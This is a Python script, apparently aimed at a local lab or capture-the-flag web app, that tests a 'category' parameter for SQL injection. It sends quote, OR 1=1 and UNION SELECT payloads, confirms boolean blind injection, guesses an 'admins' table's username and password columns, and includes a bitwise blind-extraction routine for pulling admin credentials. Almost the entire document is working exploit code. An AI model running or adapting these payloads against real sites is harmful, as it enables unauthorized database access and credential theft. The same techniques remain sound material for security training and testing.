# Objective and context
import requests
import urllib.parse
import time

target = "http://127.0.0.1:32780/"
session = requests.Session()

print("="*60)
print("RECONNAISSANCE: SQL Injection Testing on Category Parameter")
print("="*60)

# First, let's understand the normal response
def get_normal_response():
    r = session.get(f"{target}?category=Nature")
    return len(r.text), "Nature" in r.text

normal_len, has_nature = get_normal_response()
print(f"\n[1] Baseline response length: {normal_len} bytes")
print(f"    Contains 'Nature': {has_nature}")

# Test for SQL injection - error based
print("\n[2] Testing for SQL injection errors...")

error_payloads = [
    "'",
    '"',
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT 1--",
]

for payload in error_payloads:
    encoded = urllib.parse.quote(payload)
    r = session.get(f"{target}?category={encoded}")
    print(f"    Payload: {payload[:30]:<30} | Response: {len(r.text)} bytes")
    if "error" in r.text.lower() or "syntax" in r.text.lower():
        print(f"    [+] SQL Error detected!")

# Test boolean-based blind SQL injection
print("\n[3] Testing boolean-based blind SQL injection...")

bool_true = "Nature' AND '1'='1"
bool_false = "Nature' AND '1'='2"

r_true = session.get(f"{target}?category={urllib.parse.quote(bool_true)}")
r_false = session.get(f"{target}?category={urllib.parse.quote(bool_false)}")

print(f"    True condition: {len(r_true.text)} bytes")
print(f"    False condition: {len(r_false.text)} bytes")

if len(r_true.text) != len(r_false.text):
    print("    [+] Boolean-based blind SQL injection CONFIRMED!")
    blind_sqli_possible = True
else:
    print("    [-] No difference in responses")
    blind_sqli_possible = False

# Try to extract table structure
print("\n[4] Attempting to extract database structure...")

# Try UNION-based injection with different column counts
for columns in range(1, 6):
    union_payload = f"' UNION SELECT " + ",".join([str(i) for i in range(1, columns+1)]) + f" FROM information_schema.tables--"
    encoded = urllib.parse.quote(union_payload)
    r = session.get(f"{target}?category={encoded}")
    print(f"    Columns={columns}: {len(r.text)} bytes")
    if len(r.text) > normal_len + 50:
        print(f"    [+] Different response size detected!")

# Try to find admins table
print("\n[5] Looking for admins table...")

table_payloads = [
    "' UNION SELECT 1,2,3,4,5 FROM admins--",
    "' UNION SELECT username,password FROM admins--",
    "' UNION SELECT admin_user,admin_pass FROM admins--",
    "' UNION SELECT user,pass FROM admins--",
]

for payload in table_payloads:
    encoded = urllib.parse.quote(payload)
    r = session.get(f"{target}?category={encoded}")
    print(f"\n    Testing: {payload}")
    print(f"    Response size: {len(r.text)} bytes")
    if "Category does not exist" not in r.text:
        print(f"    [+] Response different from error!")
        # Print a snippet
        snippet = r.text[r.text.find('<option'):r.text.find('</option>')+9]
        if snippet:
            print(f"    Snippet: {snippet}")

# If blind injection works, try to extract data
if blind_sqli_possible:
    print("\n[6] Attempting blind extraction of admin credentials...")
    
    def blind_extract(query, char_position):
        """Extract a single character using blind SQL injection"""
        ascii_value = 0
        for bit in range(7):  # 0-127 ASCII
            test_char = ascii_value + (2 ** bit)
            payload = f"Nature' AND ASCII(SUBSTRING(({query}),{char_position},1))&{test_char}={test_char}--"
            r = session.get(f"{target}?category={urllib.parse.quote(payload)}")
            if len(r.text) > len(r_false.text):  # If true condition
                ascii_value += 2 ** bit
        return chr(ascii_value) if ascii_value > 0 else None
    
    # Try to extract first character of first admin username
    print("    Attempting to extract first character...")
    first_char = blind_extract("SELECT username FROM admins LIMIT 1", 1)
    if first_char:
        print(f"    [+] First character: {first_char}")
    else:
        print("    [-] Could not extract data")

print("\n" + "="*60)
print("Reconnaissance complete")
print("="*60)

